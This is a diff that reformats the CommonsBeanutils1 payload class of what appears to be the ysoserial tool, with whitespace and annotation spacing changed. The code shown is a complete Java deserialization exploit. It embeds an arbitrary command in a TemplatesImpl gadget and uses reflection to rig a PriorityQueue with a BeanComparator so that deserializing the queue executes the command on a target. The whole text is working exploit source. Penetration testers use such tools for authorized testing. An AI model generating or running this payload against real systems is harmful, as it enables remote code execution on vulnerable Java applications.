@@ -11,34 +11,34 @@ import ysoserial.payloads.util.Gadgets;
 import ysoserial.payloads.util.PayloadRunner;
 import ysoserial.payloads.util.Reflections;
 
-@SuppressWarnings({ "rawtypes", "unchecked" })
+@SuppressWarnings({"rawtypes", "unchecked"})
 @Dependencies({"commons-beanutils:commons-beanutils:1.9.2", "commons-collections:commons-collections:3.1", "commons-logging:commons-logging:1.2"})
-@Authors({ Authors.FROHOFF })
+@Authors({Authors.FROHOFF})
 public class CommonsBeanutils1 implements ObjectPayload<Object> {
 
-	public Object getObject(final String command) throws Exception {
-		final Object templates = Gadgets.createTemplatesImpl(command);
-		// mock method name until armed
-		final BeanComparator comparator = new BeanComparator("lowestSetBit");
+    public Object getObject(final String command) throws Exception {
+        final Object templates = Gadgets.createTemplatesImpl(command);
+        // mock method name until armed
+        final BeanComparator comparator = new BeanComparator("lowestSetBit");
 
-		// create queue with numbers and basic comparator
-		final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
-		// stub data for replacement later
-		queue.add(new BigInteger("1"));
-		queue.add(new BigInteger("1"));
+        // create queue with numbers and basic comparator
+        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
+        // stub data for replacement later
+        queue.add(new BigInteger("1"));
+        queue.add(new BigInteger("1"));
 
-		// switch method called by comparator
+        // switch method called by comparator
 //		Reflections.setFieldValue(comparator, "property", "outputProperties");
         comparator.setProperty("outputProperties");
-		// switch contents of queue
-		final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
-		queueArray[0] = templates;
-		queueArray[1] = templates;
+        // switch contents of queue
+        final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
+        queueArray[0] = templates;
+        queueArray[1] = templates;
 
-		return queue;
-	}
+        return queue;
+    }
 
-	public static void main(final String[] args) throws Exception {
-		PayloadRunner.run(CommonsBeanutils1.class, args);
-	}
+    public static void main(final String[] args) throws Exception {
+        PayloadRunner.run(CommonsBeanutils1.class, args);
+    }
 }
